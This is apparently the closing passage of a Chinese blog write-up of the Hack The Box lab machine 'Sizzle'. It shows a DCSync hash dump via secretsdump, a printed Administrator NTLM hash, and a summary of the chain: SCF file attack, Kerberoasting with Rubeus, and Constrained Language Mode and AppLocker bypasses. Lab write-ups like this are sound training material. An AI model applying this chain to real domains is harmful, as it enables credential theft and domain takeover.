+<p>虽然evil登不了（应该是像amanda一样需要搓证书），但是我们已经拥有了mrlky账户密码，直接secretsdump倾倒出hash密码</p>
+<p><img src="/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149.png"
+	width="1267"
+	height="519"
+	srcset="/htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149_hu9aa79cf9eb30f09e732cb0bb2f636a7c_201970_480x0_resize_box_3.png 480w, /htb/sizzle/1743422265446-b20acec7-6fb4-46aa-a1dc-e7eba79ce149_hu9aa79cf9eb30f09e732cb0bb2f636a7c_201970_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="585px"
+	
+></p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267</p>
+<p>同样的administratot估计也登不了evil-winrm，但是我们还有其他交互shell</p>
+<p><img src="/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31.png"
+	width="1415"
+	height="299"
+	srcset="/htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31_hu46bfa70c214dc5c246942b0859a0f689_151427_480x0_resize_box_3.png 480w, /htb/sizzle/1743422657998-bfd6bbfc-c51a-4754-b369-094d0429dc31_hu46bfa70c214dc5c246942b0859a0f689_151427_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="473"
+		data-flex-basis="1135px"
+	
+></p>
+<p>成功拿到shell</p>
+<p>再交完用户和系统标志后来理一下这个靶机的流程</p>
+<p>扫到匿名smb共享目录，发写可写的俩个文件夹，同时存在交互（删除文件）满足SCF文件攻击的特性&ndash;&gt;拿到初始用户&ndash;&gt;发现用户密码能够用在搓证书的网页搓证书得以登陆evil-winrm&ndash;&gt;bloodhound-python得知mrlky用户有SPN标志，满足Kerberoasting攻击&ndash;&gt;impacket攻击不作用使用Rubeus攻击，但是发现power shell受限&ndash;&gt;利用PSByPassCLM突破限制&ndash;&gt;后又存在AppLocker限制将文件放在特殊的文件夹下得以破解&ndash;&gt;使用rubeus.exe拿到mrlky的hash&ndash;&gt;拿到账户密码发动DCSync攻击</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Mar 31, 2025 20:25 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb/resolute/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/10.jpg" loading="lazy" data-key="" data-hash="/10.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolute</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/blackfield/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/19.jpg" loading="lazy" data-key="" data-hash="/19.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Blackfield</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/sauna/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/3.jpg" loading="lazy" data-key="" data-hash="/3.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sauna</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/active/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/1.jpg" loading="lazy" data-key="" data-hash="/1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Active</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb/forest/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/27.jpg" loading="lazy" data-key="" data-hash="/27.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Forest</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+    body {
+  position: relative;  
+}
+
+body::before {
+  content: "";
+  position: fixed;  
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url(https://nergigantes.github.io/background/1.png) no-repeat center top;
+  background-size: cover;
+  background-attachment: fixed;
+  z-index: -1;  
+}
+  </style>
+  
+    </body>
+</html>
